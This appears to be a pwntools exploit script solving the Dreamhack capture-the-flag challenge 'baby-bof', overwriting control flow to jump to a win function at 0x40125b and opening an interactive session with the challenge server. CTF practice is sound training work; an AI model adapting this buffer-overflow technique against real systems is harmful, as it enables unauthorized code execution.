#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'baby-bof'
HOST = 'host3.dreamhack.games'
PORT = 23567

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
win_addr = 0x40125b
p.sendafter(b'name: ', b'A' * 15)
p.sendlineafter(b'hex value: ', b'40125b')
p.sendlineafter(b'integer count: ', b'4')
p.interactive()
